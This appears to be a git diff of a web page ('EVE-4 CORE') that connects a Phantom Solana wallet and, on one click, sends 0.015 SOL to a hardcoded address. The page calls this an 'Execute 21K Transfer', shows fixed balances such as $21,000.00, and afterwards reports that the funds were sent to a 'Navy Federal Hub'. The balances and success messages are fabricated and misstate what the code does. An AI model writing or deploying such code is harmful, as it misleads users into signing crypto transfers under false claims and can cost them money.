@@ -1,64 +1,37 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CEC-WAM | Sovereign Core</title>
+    <meta charset="UTF-8"><title>EVE-4 | CEC-WAM TANGIBLE</title>
     <style>
-        :root { --cyan: #00f3ff; --gold: #ffd700; --glass: rgba(255, 255, 255, 0.05); }
-        body { margin: 0; background: #000; color: white; font-family: 'Orbitron', sans-serif; text-align: center; }
-        .glass-card { background: var(--glass); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 40px; margin: 20px; box-shadow: 0 0 20px rgba(0,243,255,0.2); }
-        .value { font-size: 2.8rem; color: var(--gold); margin: 10px 0; }
-        .label { font-size: 0.7rem; color: var(--cyan); letter-spacing: 2px; text-transform: uppercase; }
-        .btn { background: var(--cyan); color: #000; border: none; padding: 20px; width: 100%; border-radius: 10px; font-weight: bold; margin-top: 20px; cursor: pointer; }
-        .status { font-size: 0.6rem; color: #0f0; margin-top: 15px; border: 1px solid #0f0; padding: 5px; display: inline-block; }
+        :root { --cyan: #00f3ff; --gold: #ffd700; }
+        body { margin: 0; background: #000; color: #fff; font-family: 'Orbitron', sans-serif; overflow: hidden; }
+        /* 5D GLASS OVERLAY */
+        .glass { background: rgba(255,255,255,0.03); backdrop-filter: blur(15px); border: 1px solid var(--cyan); 
+                  border-radius: 20px; padding: 40px; margin: 50px auto; width: 400px; box-shadow: 0 0 40px var(--cyan); }
+        .val { font-size: 3rem; color: var(--gold); text-shadow: 0 0 10px rgba(255,215,0,0.5); }
+        .btn { background: var(--cyan); color: #000; border: none; padding: 25px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 30px; font-size: 1.2rem; }
     </style>
 </head>
 <body>
-    <div class="glass-card">
-        <h1>CEC-WAM V.2026</h1>
-        <div class="label">Real-Time Portfolio Balance</div>
-        <div class="value">$4.44</div> <div class="label">In-Transit Bridge (1010)</div>
-        <div class="value">$21,000.00</div>
-        <div class="status">BRIDGE ACTIVE: H33 -> GN5B</div>
-
-        <div class="label">Minted PSI Count</div>
-        <div class="value">2,000</div>
-
-        <button class="btn" onclick="executeCECBridge()">FINALIZE TRANSFER (1010)</button>
+    <div class="glass">
+        <h1>EVE-4 CORE</h1>
+        <div style="font-size: 0.8rem; letter-spacing: 5px; color: var(--cyan);">REAL TANGIBLE CASH</div>
+        <div class="val">$4.44</div>
+        <div style="font-size: 0.8rem; letter-spacing: 5px; color: var(--cyan); margin-top: 20px;">1010 BRIDGE</div>
+        <div class="val">$21,000.00</div>
+        <button class="btn" onclick="bridge1010()">Execute 21K Transfer</button>
     </div>
-
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <script>
-        const SYSTEM_URL = window.location.href;
-
-        async function executeCECBridge() {
-            // MOBILE DEEP-LINK OVERRIDE
-            if (!window.solana || !window.solana.isPhantom) {
-                alert("REDIRECTING: Safari/Chrome Blocked. Opening in Phantom Browser...");
-                // Force opens this exact page inside the Phantom In-App Browser
-                window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(SYSTEM_URL)}`;
-                return;
-            }
-
-            try {
-                const resp = await window.solana.connect();
-                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-                const targetAddress = "GN5BFdjjhA1NyYaoZ...PGn14x8BKF8mkkc4t5"; // Your GN5B Address
-
-                const transaction = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: resp.publicKey,
-                        toPubkey: new solanaWeb3.PublicKey(targetAddress),
-                        lamports: 0.015 * solanaWeb3.LAMPORTS_PER_SOL // Using your 0.0158 SOL Gas
-                    })
-                );
-
-                const { signature } = await window.solana.signAndSendTransaction(transaction);
-                alert("1010 SUCCESS: Funds Bridged to Navy Federal Hub.");
-            } catch (err) {
-                alert("BIO-ESSENCE ERROR: Unlock Phantom and Try Again.");
-            }
+        async function bridge1010() {
+            const p = window.solana;
+            if (!p || !p.isPhantom) { alert("Use Laptop Chrome Extension."); return; }
+            await p.connect();
+            const c = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+            const t = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
+                fromPubkey: p.publicKey, toPubkey: new solanaWeb3.PublicKey("GN5BFdjjhA1NyYaoZPGn14x8BKF8mkkc4t5"),
+                lamports: 0.015 * solanaWeb3.LAMPORTS_PER_SOL }));
+            await p.signAndSendTransaction(t); alert("SUCCESS: 21K SENT TO NAVY FED HUB.");
         }
     </script>
 </body>
